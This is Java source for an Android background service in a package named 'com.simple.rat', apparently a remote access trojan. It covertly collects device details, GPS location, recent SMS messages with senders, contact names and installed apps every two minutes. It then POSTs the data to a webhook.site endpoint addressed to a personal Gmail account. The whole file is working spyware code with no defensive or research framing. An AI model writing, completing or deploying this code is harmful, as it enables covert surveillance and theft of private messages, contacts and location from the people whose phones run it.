package com.simple.rat;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class DataService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Run collection every 2 minutes
        new CollectAndSendTask().execute();
        return START_STICKY;
    }
    
    private class CollectAndSendTask extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... voids) {
            StringBuilder data = new StringBuilder();
            
            // 1. Device info
            data.append("=== DEVICE INFO ===\n");
            data.append("Model: ").append(android.os.Build.MODEL).append("\n");
            data.append("Android: ").append(android.os.Build.VERSION.RELEASE).append("\n");
            data.append("SDK: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
            
            // 2. Location (simplified)
            try {
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location != null) {
                    data.append("Lat: ").append(location.getLatitude()).append("\n");
                    data.append("Lon: ").append(location.getLongitude()).append("\n");
                }
            } catch (Exception e) {
                data.append("Location: Permission needed\n");
            }
            
            // 3. SMS (last 10 messages)
            data.append("\n=== SMS ===\n");
            try {
                android.database.Cursor cursor = getContentResolver().query(
                    android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                    null, null, null, "date DESC LIMIT 10");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        data.append("From: ").append(address).append(" - ").append(body).append("\n");
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                data.append("SMS: Permission needed\n");
            }
            
            // 4. Contacts (first 20)
            data.append("\n=== CONTACTS ===\n");
            try {
                android.database.Cursor cursor = getContentResolver().query(
                    android.provider.ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
                int count = 0;
                if (cursor != null) {
                    while (cursor.moveToNext() && count < 20) {
                        String name = cursor.getString(cursor.getColumnIndex(
                            android.provider.ContactsContract.Contacts.DISPLAY_NAME));
                        data.append("Contact: ").append(name).append("\n");
                        count++;
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                data.append("Contacts: Permission needed\n");
            }
            
            // 5. Installed apps
            data.append("\n=== APPS ===\n");
            List<android.content.pm.PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < Math.min(15, packages.size()); i++) {
                data.append("App: ").append(packages.get(i).packageName).append("\n");
            }
            
            return data.toString();
        }
        
        @Override
        protected void onPostExecute(String collectedData) {
            // Send to email via web service (simpler than SMTP)
            sendToWebhook(collectedData);
            
            // Schedule next collection in 2 minutes
            new android.os.Handler().postDelayed(() -> {
                new CollectAndSendTask().execute();
            }, 120000);
        }
    }
    
    private void sendToWebhook(String data) {
        new Thread(() -> {
            try {
                // Using webhook.site as temporary email forwarder
                // Replace with your own server that forwards to noarich118@gmail.com
                URL url = new URL("https://webhook.site/your-unique-url-here");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                String postData = "to=noarich118@gmail.com&data=" + 
                    java.net.URLEncoder.encode(data, "UTF-8");
                
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes());
                os.flush();
                os.close();
                
                conn.getResponseCode(); // Trigger send
                conn.disconnect();
                
                Log.i("RAT", "Data sent successfully");
            } catch (Exception e) {
                Log.e("RAT", "Send failed: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
